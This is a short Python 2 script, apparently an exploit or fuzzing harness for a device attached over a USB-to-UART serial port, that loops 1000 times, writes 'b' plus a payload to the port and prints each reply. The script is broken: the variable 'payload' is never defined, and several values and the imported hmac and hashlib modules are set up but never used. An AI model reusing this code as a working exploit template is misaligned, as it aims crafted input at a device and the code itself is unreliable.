#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import serial, time
import hmac, hashlib

def exp(i):
    ser = serial.Serial('/dev/tty.SLAB_USBtoUART', 115200, timeout=1)

    company_name = "\x46\x00"
    name = "aisxxx"
    random_num = [0x01, 0x02, 0x03]
    count = i

    ser.write("b" + payload)
    ser.readline()
    print "[+] " + ser.readline()
    time.sleep(4)

for i in range(0,1000):
    exp(i)